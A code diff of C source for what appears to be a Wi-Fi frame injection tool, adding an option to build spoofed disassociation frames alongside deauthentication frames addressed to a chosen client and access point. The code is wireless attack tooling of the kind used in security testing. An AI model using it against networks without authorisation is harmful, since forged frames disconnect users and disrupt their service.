@@ -17,7 +17,7 @@ static u_char radiotap_preamble [] = {
 };
 
 
-static u_char *build_deauth_frame(u_char *client, u_char *bssid, int *mgmt_frame_size, u_char **frame_tail) {
+static u_char *build_deauth_frame(u_char *client, u_char *bssid, char frame_type, int *mgmt_frame_size, u_char **frame_tail) {
 
   u_char *packet, *mgmt_frame_p;
   int build_buff_size;
@@ -38,7 +38,12 @@ static u_char *build_deauth_frame(u_char *client, u_char *bssid, int *mgmt_frame
   mgmt_frame_p = packet + sizeof(radiotap_preamble);
  
   mgmt_hdr_core = (struct ieee80211a_generic_frame *)mgmt_frame_p;
-  mgmt_hdr_core->frame_ctl = MANAGEMENT_FRAME << 2 | DEAUTHENTICATION << 4;
+  mgmt_hdr_core->frame_ctl = MANAGEMENT_FRAME << 2;
+
+  if (frame_type & DISASSOCIATION_REQ) 
+     mgmt_hdr_core->frame_ctl |= DISASSOCIATION << 4;
+  else
+     mgmt_hdr_core->frame_ctl |= DEAUTHENTICATION << 4;
  
   memcpy(mgmt_hdr_core->addr_1, bssid, ETH_ALEN);
   memcpy(mgmt_hdr_core->addr_2, client, ETH_ALEN);
@@ -56,13 +61,13 @@ static u_char *build_deauth_frame(u_char *client, u_char *bssid, int *mgmt_frame
 }
 
 
-void deauth_frame_inject(char *device, u_char *client, u_char *bssid) {
+void deauth_frame_inject(char *device, u_char *client, u_char *bssid, char frame_opts) {
  
   u_char *packet, *frame_p = NULL; 
   int frame_size;
   struct ieee80211a_generic_frame *hdr_core;
   
-  packet = build_deauth_frame(client, bssid, &frame_size, &frame_p);
+  packet = build_deauth_frame(client, bssid, frame_opts, &frame_size, &frame_p);
 
   if (packet == NULL)
      perror_exit("Failed to allocate packet memory");
@@ -117,7 +122,7 @@ void *deauth_frame_inject_thr(void *job_args) {
   pthread_cleanup_push(inj_thr_cleanup, &inj_assets);
   struct frame_thrower *inj_args = (struct frame_thrower *) job_args;
 
-  inj_assets.packet = build_deauth_frame(inj_args->client, inj_args->bssid, &frame_size, &frame_p);
+  inj_assets.packet = build_deauth_frame(inj_args->client, inj_args->bssid, inj_args->frame_opts, &frame_size, &frame_p);
 
   if (inj_assets.packet == NULL) {
      
